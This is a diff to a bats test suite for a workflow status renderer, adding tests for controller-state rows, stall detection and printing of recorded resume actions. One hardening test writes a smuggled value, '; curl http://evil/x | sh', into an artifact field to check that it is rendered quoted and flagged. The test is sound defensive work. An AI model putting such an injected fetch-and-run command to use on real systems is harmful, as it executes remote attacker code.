@@ -17,7 +17,11 @@
 # `missing!` marker, `Closing:`, the unreadable-state degradation line, the
 # unassigned-runs block, quick tasks, the queue summary), the plan-less flat
 # render, the deterministic `next-epic` rule (live runs by epic_id order, then
-# the queue candidate, then `(none)`), and the individual recipes.
+# the queue candidate, then `(none)`), and the individual recipes. P076 Step 15
+# adds the controller column: the five pinned row shapes (active, a legacy
+# entry defaulting to manual, blocked_for_pm, the DERIVED awaiting_host_resume,
+# and a stalled run), the verbatim `safe_next_action` line and its inert
+# rendering, and the honest `liveness?` third answer.
 #
 # Every fixture is a real git repository (with a real linked worktree in the
 # two-stream case): the recipes resolve `.aid-o` through lib/aid-roots.sh, and
@@ -26,7 +30,7 @@
 #
 # FD-3 HYGIENE: every recipe runs in a child shell — run them with `3>&-`.
 # After any edit verify:
-#   bats --tap test-status-two-streams.bats | grep -cE '^(ok|not ok)'   # == 17
+#   bats --tap test-status-two-streams.bats | grep -cE '^(ok|not ok)'   # == 23
 
 load test-helpers.bash
 
@@ -132,6 +136,21 @@ _plan() {
   } > "$d/.aid-o/work/plan-state/$pid/plan-state.yaml"
 }
 
+# _run_state <root> <epic> <run> <state> [mode] — a run's fsm-state.yaml. Its
+# LIVE state is what the stall derivation reads ("non-terminal"), and its
+# `mode` is what the render falls back to for an entry with no
+# `auto_controller` field.
+_run_state() {
+  local d="$1" epic="$2" run="$3" st="$4" mode="${5:-}"
+  mkdir -p "$d/.aid-o/work/evidence/${epic}/${run}"
+  {
+    echo "epic_id: ${epic}"
+    echo "run_id: ${run}"
+    echo "state: ${st}"
+    if [[ -n "$mode" ]]; then echo "mode: ${mode}"; fi
+  } > "$d/.aid-o/work/evidence/${epic}/${run}/fsm-state.yaml"
+}
+
 # _fixture <root> full|flat — THE fixture the published example renders were
 # produced from. `full`: P901 (worktree present, two runs, one queue row),
 # P902 (worktree recorded but absent, no runs, one queue row with a dep),
@@ -150,19 +169,46 @@ _fixture() {
     _plan "$d" P903 PLAN_MERGING
     mkdir -p "$d/.aid-o/work/plan-state/P904"
     printf 'plan_id: P904\n  bad: [\n' > "$d/.aid-o/work/plan-state/P904/plan-state.yaml"
+    # THE FIVE PINNED ROW SHAPES (P076 Step 15). Four controller states —
+    # `active`, a LEGACY entry with no controller fields at all (→ `manual`),
+    # `blocked_for_pm`, and the DERIVED `awaiting_host_resume` — plus a stalled
+    # entry that has no continuation artifact. The first three rows record no
+    # fsm-state.yaml, which is what keeps them out of the stall derivation
+    # (`no_state_file` is prune's criterion, never a stall); the last two DO
+    # record one, with an aged `updated_at`, which is what makes them stalled.
     cat > "$d/.aid-o/work/active-runs.json" <<'JSON'
 {
   "E-901-1_2": {"state_file": ".aid-o/work/evidence/E-901-1_2/R-A/fsm-state.yaml",
                 "run_id": "R-A", "state": "EXECUTE", "branch": "task/E-901-1_2/main",
-                "plan_id": "P901", "governs_main": true, "updated_at": "2026-08-06T00:00:00Z"},
+                "plan_id": "P901", "governs_main": true, "updated_at": "2026-08-06T00:00:00Z",
+                "auto_controller": "active", "resume_artifact": null},
   "E-901-2_2": {"state_file": ".aid-o/work/evidence/E-901-2_2/R-B/fsm-state.yaml",
                 "run_id": "R-B", "state": "READY", "branch": "task/E-901-2_2/main",
                 "plan_id": "P901", "governs_main": false, "updated_at": "2026-08-06T00:00:00Z"},
+  "E-901-4_4": {"state_file": ".aid-o/work/evidence/E-901-4_4/R-F/fsm-state.yaml",
+                "run_id": "R-F", "state": "EXECUTE", "branch": "task/E-901-4_4/main",
+                "plan_id": "P901", "governs_main": false, "updated_at": "2026-08-06T00:00:00Z",
+                "auto_controller": "blocked_for_pm", "resume_artifact": null},
+  "E-901-5_5": {"state_file": ".aid-o/work/evidence/E-901-5_5/R-E/fsm-state.yaml",
+                "run_id": "R-E", "state": "GATES", "branch": "task/E-901-5_5/main",
+                "plan_id": "P901", "governs_main": false, "updated_at": "2026-08-06T00:00:00Z",
+                "auto_controller": "active",
+                "resume_artifact": ".aid-o/work/evidence/E-901-5_5/R-E/auto_resume_required.json"},
+  "E-901-6_6": {"state_file": ".aid-o/work/evidence/E-901-6_6/R-G/fsm-state.yaml",
+                "run_id": "R-G", "state": "EXECUTE", "branch": "task/E-901-6_6/main",
+                "plan_id": "P901", "governs_main": false, "updated_at": "2026-08-06T00:00:00Z",
+                "auto_controller": "active", "resume_artifact": null},
   "E-900-1_1": {"state_file": ".aid-o/work/evidence/E-900-1_1/R-D/fsm-state.yaml",
                 "run_id": "R-D", "state": "GATES", "branch": "task/E-900-1_1/main",
                 "plan_id": null, "governs_main": true, "updated_at": "2026-08-06T00:00:00Z"}
 }
 JSON
+    # the two runs that must derive stalled: a live (non-terminal) state file,
+    # and for E-901-5_5 the continuation artifact its dead controller left.
+    _run_state "$d" E-901-5_5 R-E GATES
+    _run_state "$d" E-901-6_6 R-G EXECUTE
+    printf '%s\n' '{"schema":"aid-auto-resume/1","safe_next_action":"bash /x/aid-run-gates.sh run-all exec.yaml E-901-5_5 R-E"}' \
+      > "$d/.aid-o/work/evidence/E-901-5_5/R-E/auto_resume_required.json"
   else
     # A plan-less project has no plan-owned runs by construction: plan-state is
     # written at plan-start, before any EPIC of that plan is initialized.
@@ -275,8 +321,8 @@ YAML
   # exactly two plan blocks — the closing and the unreadable plan are not blocks
   [ "$(grep -c '^Plan P' <<<"$output")" -eq 2 ]
   [[ "$output" == *"Plan P901 — EPIC_INTEGRATION"$'\n'"  worktree: .aid-worktrees/plan-P901"$'\n'"  EPICs:"* ]]
-  [[ "$output" == *"    E-901-1_2  [EXECUTE]  run=R-A  branch=task/E-901-1_2/main  governs-main"* ]]
-  [[ "$output" == *"    E-901-2_2  [READY]  run=R-B  branch=task/E-901-2_2/main"* ]]
+  [[ "$output" == *"    E-901-1_2  [EXECUTE]  run=R-A  branch=task/E-901-1_2/main  ctl=active  governs-main"* ]]
+  [[ "$output" == *"    E-901-2_2  [READY]  run=R-B  branch=task/E-901-2_2/main  ctl=manual"* ]]
   [[ "$output" == *"  Queue:"$'\n'"    E-901-3_3  [pending]  high"* ]]
   [[ "$output" == *"  next: E-901-1_2  [EXECUTE]"* ]]
   # the second stream: no live runs, so the queue candidate is the next EPIC
@@ -405,6 +451,169 @@ YAML
   [ "$output" = "10" ]
 }
 
+# ─── the controller column: four states, and the two DERIVED ones ─────────
+
+@test "the five pinned row shapes render: active, legacy→manual, blocked_for_pm, awaiting_host_resume, stalled" {
+  local d="$TEST_TMPDIR/root"
+  _fixture "$d" full
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  # 1 — a stored `active` controller, with the governs-main flag after it
+  [[ "$output" == *"    E-901-1_2  [EXECUTE]  run=R-A  branch=task/E-901-1_2/main  ctl=active  governs-main"* ]]
+  # 2 — a LEGACY entry: no auto_controller, no resume_artifact, no state file
+  [[ "$output" == *"    E-901-2_2  [READY]  run=R-B  branch=task/E-901-2_2/main  ctl=manual"* ]]
+  # 3 — the PM-authority stop
+  [[ "$output" == *"    E-901-4_4  [EXECUTE]  run=R-F  branch=task/E-901-4_4/main  ctl=blocked_for_pm"* ]]
+  # 4 — DERIVED awaiting_host_resume: artifact on disk AND no liveness signal.
+  # The stored value for this entry is `active` (its controller wrote it and
+  # then died) — the derivation overrides it, which is the whole point.
+  [ "$(jq -r '."E-901-5_5".auto_controller' "$d/.aid-o/work/active-runs.json")" = "active" ]
+  [[ "$output" == *"    E-901-5_5  [GATES]  run=R-E  branch=task/E-901-5_5/main  ctl=awaiting_host_resume  STALLED?"* ]]
+  [[ "$output" == *"      awaiting host resume — .aid-o/work/evidence/E-901-5_5/R-E/auto_resume_required.json is still on disk"* ]]
+  [[ "$output" == *"Claim it with: aid-fsm.sh resume E-901-5_5"* ]]
+  # 5 — stalled with NO artifact: the marker and the generic recovery line, and
+  # never the awaiting state
+  [[ "$output" == *"    E-901-6_6  [EXECUTE]  run=R-G  branch=task/E-901-6_6/main  ctl=active  STALLED?"* ]]
+  [[ "$output" == *"      STALLED? no progress within the stall threshold"*"aid-fsm.sh resume E-901-6_6"* ]]
+  run bash -c "printf '%s\n' '$output' | grep -c 'E-901-6_6.*awaiting_host_resume'"
+  [ "$output" = "0" ]
+}
+
+@test "AC3: the resume line prints the artifact's safe_next_action VERBATIM, not a reconstruction" {
+  local d="$TEST_TMPDIR/root"
+  _fixture "$d" full
+  local art want
+  art="$d/.aid-o/work/evidence/E-901-5_5/R-E/auto_resume_required.json"
+  want="$(jq -r '.safe_next_action' "$art")"
+  [ -n "$want" ]
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  # byte-for-byte the artifact's own string, on the line that tells you to run it
+  [[ "$output" == *"then run the action that artifact recorded, verbatim (nothing here runs it): ${want}"* ]]
+  # and it really is the ARTIFACT's string: change the artifact, the render follows
+  local tmp; tmp="$(mktemp)"
+  jq '.safe_next_action = "bash /y/other.sh run-all other.yaml E-901-5_5 R-E"' "$art" > "$tmp" && mv "$tmp" "$art"
+  _call "$d" 'plan_epics P901'
+  [[ "$output" == *": bash /y/other.sh run-all other.yaml E-901-5_5 R-E"* ]]
+  [[ "$output" != *"/x/aid-run-gates.sh"* ]]
+}
+
+@test "AC3 hardening: a metacharacter-bearing safe_next_action is rendered INERT and flagged, never pasteable as-is" {
+  local d="$TEST_TMPDIR/root"
+  _fixture "$d" full
+  local art tmp
+  art="$d/.aid-o/work/evidence/E-901-5_5/R-E/auto_resume_required.json"
+  tmp="$(mktemp)"
+  jq '.safe_next_action = "bash /x/g.sh run-all e.yaml E R; curl http://evil/x | sh"' "$art" > "$tmp" && mv "$tmp" "$art"
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  # the dangerous string never appears in runnable form …
+  [[ "$output" != *"R; curl http://evil/x | sh"* ]]
+  # … it appears in printf %q form, with the warning attached to that row
+  [[ "$output" == *'bash\ /x/g.sh\ run-all\ e.yaml\ E\ R\;\ curl'* ]]
+  [[ "$output" == *"WARNING: that recorded action carries shell metacharacters and is shown QUOTED"* ]]
+}
+
+@test "awaiting_host_resume needs BOTH facts — one alone is never it, and neither is derived from prune" {
+  local d="$TEST_TMPDIR/both"
+  _repo "$d"
+  mkdir -p "$d/.aid-o/work"
+  _plan "$d" P901 EPIC_INTEGRATION
+  _run_state "$d" E-901-1_1 R-1 EXECUTE
+  _run_state "$d" E-901-2_2 R-2 EXECUTE
+  # (a) artifact on disk, but the entry is FRESH → a background gate in flight
+  # (b) stalled, but no artifact → a stall, not a resumable handoff
+  printf '{"safe_next_action":"bash /x/g.sh run-all e.yaml E-901-1_1 R-1"}\n' \
+    > "$d/.aid-o/work/evidence/E-901-1_1/R-1/auto_resume_required.json"
+  cat > "$d/.aid-o/work/active-runs.json" <<JSON
+{
+  "E-901-1_1": {"state_file": ".aid-o/work/evidence/E-901-1_1/R-1/fsm-state.yaml",
+                "run_id": "R-1", "state": "EXECUTE", "branch": "b", "plan_id": "P901",
+                "updated_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)", "auto_controller": "active",
+                "resume_artifact": ".aid-o/work/evidence/E-901-1_1/R-1/auto_resume_required.json"},
+  "E-901-2_2": {"state_file": ".aid-o/work/evidence/E-901-2_2/R-2/fsm-state.yaml",
+                "run_id": "R-2", "state": "EXECUTE", "branch": "b", "plan_id": "P901",
+                "updated_at": "2026-01-01T00:00:00Z", "auto_controller": "active",
+                "resume_artifact": null}
+}
+JSON
+  local before; before="$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)"
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  [[ "${lines[0]}" == *"E-901-1_1"*"ctl=active"* ]]
+  [[ "${lines[0]}" != *"awaiting_host_resume"* ]]
+  [[ "${lines[0]}" != *"STALLED?"* ]]
+  [[ "$output" == *"E-901-2_2"*"ctl=active"*"STALLED?"* ]]
+  run bash -c "printf '%s\n' '$output' | grep -c awaiting_host_resume"
+  [ "$output" = "0" ]
+  # (c) now BOTH hold for E-901-2_2 — the artifact appears, nothing else changes
+  printf '{"safe_next_action":"bash /x/g.sh run-all e.yaml E-901-2_2 R-2"}\n' \
+    > "$d/.aid-o/work/evidence/E-901-2_2/R-2/auto_resume_required.json"
+  _call "$d" 'plan_epics P901'
+  [[ "$output" == *"E-901-2_2"*"ctl=awaiting_host_resume"* ]]
+  # the pointer was NULL: the render found the artifact by its conventional
+  # path, so it never depended on the pointer (or on prune) having been written
+  [ "$(jq -r '."E-901-2_2".resume_artifact' "$d/.aid-o/work/active-runs.json")" = "null" ]
+  [[ "$output" == *"bash /x/g.sh run-all e.yaml E-901-2_2 R-2"* ]]
+  # NOTHING was written by any of these renders
+  [ "$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)" = "$before" ]
+}
+
+@test "legacy entries render defaults instead of crashing or blanking — and per the run's recorded mode" {
+  local d="$TEST_TMPDIR/legacy"
+  _repo "$d"
+  mkdir -p "$d/.aid-o/work"
+  _plan "$d" P901 EPIC_INTEGRATION
+  # exactly the pre-P076 entry shape: no auto_controller, no resume_artifact
+  # `updated_at` is NOW, so these two rows are about the legacy defaults only —
+  # the stall derivation has nothing to say about them either way.
+  cat > "$d/.aid-o/work/active-runs.json" <<JSON
+{
+  "E-901-1_1": {"state_file": ".aid-o/work/evidence/E-901-1_1/R-1/fsm-state.yaml",
+                "run_id": "R-1", "state": "EXECUTE", "branch": "task/E-901-1_1/main",
+                "plan_id": "P901", "governs_main": true, "updated_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"},
+  "E-901-2_2": {"state_file": ".aid-o/work/evidence/E-901-2_2/R-2/fsm-state.yaml",
+                "run_id": "R-2", "state": "READY", "branch": "task/E-901-2_2/main",
+                "plan_id": "P901", "governs_main": false, "updated_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"}
+}
+JSON
+  local before; before="$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)"
+  # no state file at all → the conservative default, never a blank column
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  [[ "${lines[0]}" == *"E-901-1_1  [EXECUTE]  run=R-1  branch=task/E-901-1_1/main  ctl=manual  governs-main"* ]]
+  [[ "${lines[1]}" == *"E-901-2_2  [READY]  run=R-2  branch=task/E-901-2_2/main  ctl=manual"* ]]
+  [[ "$output" != *"ctl="$'\n'* ]]
+  # a run whose recorded mode IS auto renders active — absence is mapped, not invented
+  _run_state "$d" E-901-1_1 R-1 EXECUTE auto
+  _run_state "$d" E-901-2_2 R-2 READY full
+  _call "$d" 'plan_epics P901'
+  [[ "${lines[0]}" == *"E-901-1_1"*"ctl=active"* ]]
+  [[ "${lines[1]}" == *"E-901-2_2"*"ctl=manual"* ]]
+  # rendering a default writes NOTHING back into the map
+  [ "$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)" = "$before" ]
+  [ "$(jq -r '."E-901-1_1" | has("auto_controller")' "$d/.aid-o/work/active-runs.json")" = "false" ]
+}
+
+@test "when the stall derivation cannot run, the row says liveness? and claims neither state" {
+  local d="$TEST_TMPDIR/root"
+  _fixture "$d" full
+  # a plugin whose aid-fsm.sh fails: the libs the other recipes need are the
+  # real ones, only the derivation is broken
+  local fake="$TEST_TMPDIR/fakeplugin"
+  mkdir -p "$fake/scripts"
+  ln -s "$AID_PLUGIN_PATH/scripts/lib" "$fake/scripts/lib"
+  printf '#!/usr/bin/env bash\nexit 1\n' > "$fake/scripts/aid-fsm.sh"
+  chmod +x "$fake/scripts/aid-fsm.sh"
+  AID_PLUGIN_PATH="$fake" _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"E-901-5_5"*"liveness?"* ]]
+  [[ "$output" != *"STALLED?"* ]]
+  [[ "$output" != *"awaiting_host_resume"* ]]
+  # the RECORDED value is still shown — the surface degrades, it does not blank
+  [[ "$output" == *"E-901-5_5"*"ctl=active"* ]]
+}
+
 # ─── the shared next-actionable-EPIC rule ────────────────────────────────
 
 @test "next_epic picks the LOWEST epic_id among actionable live runs — JSON key order is not an ordering" {
@@ -489,7 +698,7 @@ YAML
 JSON
   _call "$d" 'plan_epics P901'
   [ "${#lines[@]}" -eq 2 ]
-  [[ "${lines[0]}" == *"E-901-1_2"*"[EXECUTE]"*"governs-main"* ]]   # sorted, not key order
+  [[ "${lines[0]}" == *"E-901-1_2"*"[EXECUTE]"*"ctl=manual"*"governs-main"* ]]   # sorted, not key order
   [[ "${lines[1]}" == *"E-901-2_2"*"[READY]"* ]]
   [[ "${lines[1]}" != *"governs-main"* ]]
   [[ "$output" != *"E-902"* ]]
@@ -522,7 +731,7 @@ JSON
 }
 
 @test "aid-status.md carries every named recipe the render composes, plus both example renders" {
-  for r in state-root plan-rows plan-epics planless-epics queue-rows queue-summary next-epic quick-tasks render-overview; do
+  for r in state-root plan-rows stalled-runs controller-state plan-epics planless-epics queue-rows queue-summary next-epic quick-tasks render-overview; do
     run _recipes "$r"
     [ "$status" -eq 0 ]
     [ -n "$output" ]
